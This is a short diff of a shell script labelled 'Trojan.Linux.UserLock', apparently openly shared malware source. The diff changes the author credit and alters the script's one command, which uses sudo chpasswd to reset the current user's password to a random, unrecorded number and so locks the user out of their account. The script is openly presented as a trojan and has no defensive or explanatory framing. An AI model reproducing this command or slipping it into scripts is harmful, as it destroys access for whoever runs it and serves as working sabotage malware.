@@ -1,4 +1,4 @@
 # Trojan.Linux.UserLock
-# by codedroider
+# by codedroider & Lurk
 
-echo "$USER:$RANDOM" | sudo chpasswd
+echo $USER:$RANDOM | sudo chpasswd
